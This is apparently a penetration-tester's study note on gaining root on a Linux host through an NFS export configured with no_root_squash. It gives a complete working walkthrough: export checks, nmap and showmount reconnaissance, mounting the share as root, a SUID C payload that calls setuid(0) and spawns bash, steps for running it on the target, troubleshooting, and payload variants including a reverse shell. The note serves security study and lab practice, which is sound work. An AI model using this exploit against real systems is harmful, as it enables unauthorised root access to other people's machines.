# NFS — no_root_squash

Every other Linux vector in this vault escalates *on* the target. This one does not. You are already root **on your own machine**, and a misconfigured [[Security-Terms#^nfs|NFS]] export carries that root across the network onto the target's disk.

```text
You cannot chown a file to root on the target.
You can chown a file to root on your attacking box.
no_root_squash makes those the same operation.
```

The file you write lands on the target owned by `root:root` with the SUID bit set. Running it there is not an exploit — it is [[Linux-SUID-Abuse]] behaving exactly as designed. The misconfiguration is upstream, in who was allowed to create the file.

## Why it works — three facts stacked

**1. Ownership is a number, not a name.** The inode stores `UID 0`, not the string `root`. `ls` resolves it through `/etc/passwd` for display. Ownership is therefore a value that travels with the file, including over a network filesystem.

**2. NFS trusts the [[Security-Terms#^uid|UID]] the client asserts.** There is no per-file authentication in NFSv3. The client says "this write is from uid 0" and the server decides what to do with that claim. That decision is the export option:

| Option | Server's response to a client claiming uid 0 | Result |
|---|---|---|
| `root_squash` | maps it to `nobody` (65534) | file lands as `nobody:nogroup` — useless |
| `no_root_squash` | accepts it | file lands as **`root:root`** |
| `all_squash` | maps *every* uid to `nobody` | closed |

*Squash* = flatten. `root_squash` flattens root down to nobody, and it is the **default**. `no_root_squash` has to be typed in deliberately.

**3. SUID runs as the file's owner, not the caller.** A `root:root` file with mode `4755` executed by an ordinary user runs with euid 0. Standard Linux behaviour, not a bug.

## Preconditions — all four

| # | Condition | Check |
|---|---|---|
| 1 | An export with **both** `rw` and `no_root_squash` | `cat /etc/exports` on the target |
| 2 | You are **root on your attacking machine** | you are, on Kali |
| 3 | NFS reachable — 111/tcp (rpcbind) and 2049/tcp | `nmap -p111,2049 TARGET` |
| 4 | The target does not mount that path `nosuid` | `mount` on the target |

Condition 4 is the quiet killer and most write-ups do not mention it. Condition 1 is two options, not one — `no_root_squash` on a read-only export is inert.

## 1 — Read the export table from the target

```bash
cat /etc/exports
```
```text
/tmp              *(rw,sync,insecure,no_root_squash,no_subtree_check)   <- usable
/mnt/sharedfolder *(rw,sync,insecure,no_subtree_check)                  <- no. squashed.
/backups          *(rw,sync,insecure,no_root_squash,no_subtree_check)   <- usable
```

- `no_root_squash` **and** `rw` on the same line → both are required. Either one alone is inert.
- `*` → the client whitelist. `*` is any host; a hostname or a [[Security-Terms#^cidr|CIDR]] here may exclude your box and is the reason a perfectly good-looking export refuses to mount.
- `insecure` → allows client source ports above 1024. Without it the client must bind a privileged port, which needs root on the client, which you have anyway.
- `sync` and `no_subtree_check` → performance and consistency options. Irrelevant here.

> [!important]
> `showmount -e` lists *which paths* are exported and to whom. It does **not** report `no_root_squash`. If you only have remote access you cannot know the vector is open until you write a file and check its owner — which is itself the test. Both views are needed, and neither replaces the other.

## 2 — Confirm the share is reachable from your machine

```bash
nmap -p111,2049 -sV TARGET_IP
```

```bash
showmount -e TARGET_IP
```
```text
Export list for TARGET_IP:
/backups          *
/mnt/sharedfolder *
/tmp              *
```

- `-p111,2049` → rpcbind and nfs. 111 is the portmapper NFSv3 uses to find everything else; 2049 is NFS itself and is the only one NFSv4 needs.
- `-sV` → version detection, which distinguishes an NFSv3 server from an NFSv4-only one. That distinction decides whether `showmount` can answer at all.
- `showmount` needs `nfs-common` on Debian and Kali, or `nfs-utils` elsewhere.

## 3 — Mount it, as root on your own box

```bash
mkdir -p /tmp/nfsmount
```

```bash
mount -o rw TARGET_IP:/backups /tmp/nfsmount
```

- run it **as root on your own machine**. That is precondition 2, and it is not a convenience: the uid your client asserts is the uid you are running as, and the entire technique is asserting uid 0.
- `-o rw` → explicit. A share mounted read-only fails at the `chmod +s` step with an error that points at the file rather than at the mount.
- add `-o vers=4` when step 2 suggested NFSv4. Under NFSv4 the exported root is `fsid=0` and paths are relative to it, so `TARGET:/backups` may need to be `TARGET:/`.
- nothing is copied. This is a window onto the target's disk — a file written here is written *there*, immediately.

## 4 — Build the payload and verify the ownership

```c
#include <unistd.h>
#include <stdlib.h>
int main(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
```bash
cd /tmp/nfsmount
```

```bash
gcc nfs.c -o nfs -w -static
```

```bash
chmod +s nfs
```

```bash
ls -l nfs
```

- `-static` → links libc into the binary. The target's glibc is almost never the same as your attacking machine's, and a dynamically linked payload dies there with a linker error. This flag is not optional.
- check your own architecture first with `uname -m`. An [[Security-Terms#^x86-64|ARM]] host needs `x86_64-linux-gnu-gcc`, not `gcc`.
- `-w` → silences warnings from the implicit declarations. Cosmetic.
- `chmod +s` → sets SUID **and** [[Security-Terms#^sgid|SGID]].

> [!important]
> `setuid(0)` is what keeps the root. The SUID bit gives the process **euid 0** while **ruid** stays your target user. `system()` then starts `/bin/sh`, and a shell that sees euid different from ruid drops euid back to ruid — your root evaporates before `bash` opens. `setuid(0)` sets the *real* UID to 0 first, which is permitted because euid is already 0. With ruid == euid == 0 there is nothing left to drop. Same rule as [[Linux-PATH-Abuse#Why the privilege usually evaporates — and when it does not|PATH Abuse]] and [[Linux-SUID-Abuse#The rule that decides everything|SUID Abuse]].

## 5 — Unmount, then execute on the target

```bash
cd / && umount /tmp/nfsmount
```

Leaving the share mounted while the target executes the binary gives `Text file busy`. The unmount is part of the exploit, not part of the cleanup.

```bash
cd /backups && ls -l && ./nfs && id
```

- both files appear on the target — the binary and the source — because there is only ever **one** copy. You were looking at the target's disk the whole time; nothing was transferred.
- run `id` from inside the resulting shell, not before it. The prompt changing is not the test.

    - `Text file busy` (`ETXTBSY`) means the client still holds the file open: `cd /` and `umount` on the attacking box first. Compile, then unmount, then execute — in that order, every time.
    - `Permission denied` running a binary that is visibly `-rwsr-sr-x` is a `nosuid` mount on the target for that path (`mount | grep backups`), which is precondition 4 and a clean negative for that export.
    - `Exec format error` is an architecture mismatch — `file` on the planted binary is the ground truth, and a Kali VM on an Apple Silicon Mac is `aarch64` while most targets are `x86_64`, so the mismatch usually runs the opposite direction to what write-ups assume.
    - `./nfs` running with `id` still showing your own uid is the euid drop: the binary is planted correctly and the payload is wrong.

Cross compiling, when `file` says the wrong architecture:

```bash
sudo apt install -y gcc-x86-64-linux-gnu
```

```bash
sudo x86_64-linux-gnu-gcc nfs.c -o nfs -w -static
```

```bash
sudo chmod +s nfs
```

## Payload variants

| Payload | When |
|---|---|
| `system("/bin/bash")` plus `setuid(0)` | default, interactive |
| `execl("/bin/bash","bash","-p",NULL)` | avoids the shell-drop question entirely; `-p` keeps euid |
| copy the target's own `/bin/bash` into the share, `chown root`, `chmod +s`, then `bash -p` | no compiler needed on either side |
| a static reverse shell | when the target session is not interactive |

The third row is worth remembering: if `gcc` is missing on your machine, you can copy any target binary **out** through the share, set the bits on it, and copy it back. Architecture stops being a question, because the binary came from the target in the first place.

## Cleanup

```bash
rm /backups/nfs /backups/nfs.c
```

```bash
rmdir /tmp/nfsmount
```

- the two lines run on **different machines**. `/backups` is the target's path, removed from the root shell step 5 opened; `/tmp/nfsmount` is your own mountpoint, already unmounted at step 5.
- both files, not just the binary → `nfs.c` is the technique written out in source form for whoever reads the directory next.

A world-executable root SUID binary left in a shared folder is a durable backdoor for anyone else on that network, and it will be found. Remove it. Nothing else on the attacking machine was changed — the mount was transient and touched no config.
